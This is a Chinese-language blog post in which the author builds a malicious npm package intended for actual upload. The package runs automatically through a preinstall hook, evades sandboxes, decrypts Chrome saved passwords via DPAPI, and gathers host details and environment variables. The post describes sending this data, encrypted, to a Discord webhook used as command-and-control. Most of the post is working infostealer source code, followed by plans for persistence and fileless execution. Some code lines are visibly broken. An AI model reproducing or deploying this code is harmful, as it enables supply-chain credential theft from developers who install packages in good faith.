---
layout:     post                       
title:    第一个one shot npm包-基于Discord webhook的c2
subtitle:   
date:       2025-10-17      
author:     Closure                         
header-img: img/fmqwq.jpg
catalog: true                         
tags:                               
    - 笔记
    - 安全
---

### 为什么做这个

[Threat Actors Weaponize Discord Webhooks for Command and Control with npm, PyPI, and Ruby Packages](https://cybersecuritynews.com/threat-actors-weaponize-discord-webhooks/ "Threat Actors Weaponize Discord Webhooks for Command and Control with npm, PyPI, and Ruby Packages")

这篇是通过在npm PyPI RubyGems上投放恶意包，在install-time hooks执行恶意代码，收集信息然后POST 到硬编码的 Discord webhook，因为流量是发往discord.com能躲过很多基于域名和签名的检测。

- **贴出来的部分代码都是描述性命名和线性流程读起来很顺畅，实际上传的东西是混淆的。**

测试用的现成的工具 https://obfuscator.io/

![ ](/img/20251017-1.png)

Npm查杀是静态与元数据扫描，和GitHub Advisory DB 联动 只能对已知漏洞版本打标，缺乏强制的行为审计与沙箱，也没有无工审核和签名验证。还有npm的模块机制是高度依赖递归安装的，恶意包不必直接被用户引用，只需要作为某个常用包的依赖，并且npm 安装时自动解析依赖树，用户默认信任上游依赖。

所以理论成立，就是做一个模块化的盗取谷歌浏览器的npm包，混淆完代码上传然后挂dc服务器私人频道当一次性用。

### C2配置

原文里面没有加密，所以自己写了一个，为了确保只有我们能读取窃取到的数据所以用的是混合加密方案。在config.js文件中我配置了一个 RSA-4096 的公钥，用这个AES密钥加密窃取到的数据，然后用配置文件中的RSA 公钥来加密这个AES会话密钥，最后将加密后的数据和加密后的密钥一起发送到Discord Webhook。

C2填的是自己discord频道，因为Discord Webhook 对单条消息的长度有限制，为了能发送大量数据我把加密后的数据分割成1900字节的小块。代码会为每一次完整的数据发送生成一个唯一的sessionId，然后将每个数据块连同sessionId和分块信息一起发送。

```
const crypto = require('crypto');
const { C2_PUBLIC_KEY } = require('./config');

function rsaEncrypt(dataToEncrypt) {
    const encryptedBuffer = crypto.publicEncrypt(
        {
            key: C2_PUBLIC_KEY,
            padding: crypto.constants.RSA_PKCS1_OAEP_PADDING,
            oaepHash: 'sha256',
        },
        dataToEncrypt
    );
    return encryptedBuffer.toString('base64');
}

function aesEncrypt(plaintext, key, iv) {
    const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
    let encrypted = cipher.update(plaintext, 'utf8', 'base64');
    encrypted += cipher.final('base64');
    const authTag = cipher.getAuthTag().toString('base64');
    return { encrypted, authTag };
}

function aesDecrypt(encryptedText, key, iv, authTag) {
    try {
        const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
        decipher.setAuthTag(Buffer.from(authTag, 'base64'));
        let decrypted = decipher.update(encryptedText, 'base64', 'utf8');
        decrypted += decipher.final('utf8');
        return decrypted;
    } catch (error) {
        return null;
    }
}

module.exports = {
    rsaEncrypt,
    aesEncrypt,
    aesDecrypt,
};
```

### 自动执行&沙箱

![ ](/img/20251017-2.jpg)

preinstall是标准脚本钩子，当用户用命令来安装我这个包的时候 npm会在开始安装依赖之前自动执行 preinstall 脚本中定义的命令，在这里直接运行 node main.js 在用户毫不知情的情况下启动了整个恶意代码的执行链。

沙箱老一套基础版，一个时间加速检测和用户活动检测。

```
const { exec } = require('child_process');
const os = require('os');
const { SLEEP_CHECK_DURATION_MS, SLEEP_CHECK_TOLERANCE } = require('./config');

function detectSleepAcceleration() {
    return new Promise((resolve) => {
        const startTime = Date.now();
        setTimeout(() => {
            const endTime = Date.now();
            const elapsedTime = endTime - startTime;
            if (elapsedTime < SLEEP_CHECK_DURATION_MS * SLEEP_CHECK_TOLERANCE) {
                resolve(true);
            } else {
                resolve(false);
            }
        }, SLEEP_CHECK_DURATION_MS);
    });
}

function detectUserActivity() {
    return new Promise((resolve) => {
        const platform = os.platform();
        let command;

        if (platform === 'linux' |

| platform === 'darwin') {
            command = 'w';
        } else if (platform === 'win32') {
            command = 'quser';
        } else {
            return resolve(true);
        }

        exec(command, (error, stdout, stderr) => {
            if (error |

| stdout.trim().length === 0) {
                return resolve(false);
            }
            resolve(true);
        });
    });
}

async function runEvasionChecks() {
    const isSandbox = await detectSleepAcceleration();
    if (isSandbox) {
        return false;
    }

    const hasUserActivity = await detectUserActivity();
    if (!hasUserActivity) {
        return false;
    }

    return true;
}

module.exports = { runEvasionChecks };
```

### 核心行为

modules/browser.js模块，攻击目标就是Win操作系统下的Google Chrome 。

getMasterKey函数定位读取Chrome的Local State文件，提取被Windows DPAPI加密的浏览器主密钥，通过利用@primno/dpapi 这个库，我这个包能够调用系统底层的加密接口来解密，因为脚本正以当前用户的身份运行，所以天然拥有解密该用户数据的权限。

获得了这个明文主密钥就有权限了，为了绕过Chrome运行时对Login Data数据库文件的锁定，先将该文件复制到系统临时目录，然后用sqlite3库连接这个数据库副本，查询logins表，遍历其中存储的所有网站URL 用户名和被加密的密码。

对于每一条密码解析出加密时使用的nonce、ciphertext、 authTag，最后调用内置的crypto模块，结合之前获取的主密钥执行AES-256-GCM解密算法，将密码还原成明文。

```
const fs = require('fs');
const path = require('path');
const os = require('os');
const crypto = require('crypto');
const { Dpapi } = require('@primno/dpapi');
const sqlite3 = require('sqlite3');

async function stealBrowserPasswords() {
    if (os.platform()!== 'win32') {
        return;
    }

    try {
        const chromePath = path.join(os.homedir(), 'AppData', 'Local', 'Google', 'Chrome', 'User Data');
        if (!fs.existsSync(chromePath)) return;
        
        const masterKey = getMasterKey(chromePath);
        if (!masterKey) return;

        return await getLoginData(chromePath, masterKey);
    } catch (error) {
        return;
    }
}

function getMasterKey(chromePath) {
    try {
        const localStatePath = path.join(chromePath, 'Local State');
        if (!fs.existsSync(localStatePath)) return null;

        const localStateContent = fs.readFileSync(localStatePath, 'utf-8');
        const localState = JSON.parse(localStateContent);
        const encryptedKeyBase64 = localState.os_crypt.encrypted_key;
        const encryptedKey = Buffer.from(encryptedKeyBase64, 'base64');
        const encryptedKeyWithoutPrefix = encryptedKey.slice(5);

        return Dpapi.unprotectData(encryptedKeyWithoutPrefix, null, 'CurrentUser');
    } catch (e) {
        return null;
    }
}

function getLoginData(chromePath, masterKey) {
    return new Promise((resolve) => {
        const loginDataPath = path.join(chromePath, 'Default', 'Login Data');
        if (!fs.existsSync(loginDataPath)) return resolve();

        const tempLoginDataPath = path.join(os.tmpdir(), `login_data_${Date.now()}`);
        
        try {
            fs.copyFileSync(loginDataPath, tempLoginDataPath);
        } catch (e) {
            return resolve();
        }

        const db = new sqlite3.Database(tempLoginDataPath, sqlite3.OPEN_READONLY, (err) => {
            if (err) {
                fs.unlinkSync(tempLoginDataPath);
                return resolve();
            }
        });

        const credentials =;
        db.each('SELECT origin_url, username_value, password_value FROM logins', (err, row) => {
            if (err ||!row.password_value) return;

            try {
                const nonce = row.password_value.slice(3, 15);
                const ciphertext = row.password_value.slice(15, row.password_value.length - 16);
                const authTag = row.password_value.slice(row.password_value.length - 16);

                const decipher = crypto.createDecipheriv('aes-256-gcm', masterKey, nonce);
                decipher.setAuthTag(authTag);

                let decryptedPassword = decipher.update(ciphertext, 'base64', 'utf8');
                decryptedPassword += decipher.final('utf8');

                credentials.push({
                    url: row.origin_url,
                    username: row.username_value,
                    password: decryptedPassword
                });
            } catch (e) {

            }
        }, (err, count) => {
            db.close();
            fs.unlink(tempLoginDataPath, () => {});
            if (err) return resolve();
            resolve(credentials);
        });
    });
}

module.exports = { stealBrowserPasswords };
```

### 数据整合与准备回传

在成功窃取浏览器凭据之后，把这些凭据数据与收集的系统基础信息进行合并，形成一个完整JSON对象，包含了本次攻击所能获取到的全部有信息，const finalPayload = { ...initialPayload, browser_credentials: browserCredentials, }; 将两部分数据聚合在一起，最后将这个完整的载荷交给network.js模块中的 exfiltrateData 函数进行加密和回传。

```
const { runEvasionChecks } = require('./evasion');
const { exfiltrateData } = require('./network');
const { stealBrowserPasswords } = require('./modules/browser');
const os = require('os');

async function main() {
    try {
        const checksPassed = await runEvasionChecks();
        if (!checksPassed) {
            process.exit(0);
        }

        const initialPayload = {
            id: os.hostname(),
            user: os.userInfo().username,
            platform: os.platform(),
            arch: os.arch(),
            homeDir: os.homedir(),
            env: process.env,
            timestamp: new Date().toISOString(),
            type: 'initial_compromise',
        };

        const browserCredentials = await stealBrowserPasswords();
        
        const finalPayload = {
          ...initialPayload,
            browser_credentials: browserCredentials,
        };

        await exfiltrateData(finalPayload);

    } catch (error) {
    } finally {
        process.exit(0);
    }
}

main();
```

### Reflection

过去我以为窃取DPAPI加密的数据需要C++或C#这类更底层的语言，但是@primno/dpapi这个库，Node.js也能轻易地调用Windows核心加密服务（

对于操作系统来说下载的脚本就是用户本人意图的延伸，当我们调用@primno/dpapi库去解密Local State文件中的主密钥时DPAPI会配合，因为它认为这是一个合法的请求。整个窃取流程是读取Local State获取加密主密钥-调用DPAPI解密获得明文主密钥 -复制Login Data数据库以绕开文件锁 - 使用主密钥和AES-256-GCM算法解密数据库中的密码

而且理论上Chrome的路径是固定的，但是目标可能像我一样安装了不同版本的Chrome，我这个代码只检查了默认路径，下次得加点其他逻辑（？

一开始我以为直接将拿到的JSON数据一把梭哈发送到Discord Webhook就可以了，但是窃取到的密码数量很多的时候，序列化后的JSON字符串轻易就会超限，所以后来我写了数据分块逻辑，为每个分块添加sessionId和分块序号。

尝试下在macOS/Linux上创建Cron jobs or LaunchAgents，安全地从C2服务器获取新的JS模块，用内存执行技术比如vm模块在隔离的上下文中运行代码从而避免在磁盘上留下文件，绕过基于文件的杀毒软件扫描。 现在的Discord当C2虽然可以绕过一些基础检测，所以得弄点备用通道。

后续的话，因为现在仅针对Win的Google Chrome 浏览器的默认用户配置文件，后面开发加入多Profile支持，现在代码只检查了Default目录，后续写的话应该是遍历User Data目录识别所有存在的Profile文件夹，并对每一个文件夹内的 Login Data 文件重复执行窃取流程。

许多主流浏览器都基于Chromium内核，也就是密码管理机制与Chrome几乎完全相同，同样依赖DPAPI加密，区别仅在于它们的User Data存储在各自的路径下，后面写个常见Chromium浏览器路径的列表依次进行扫描。



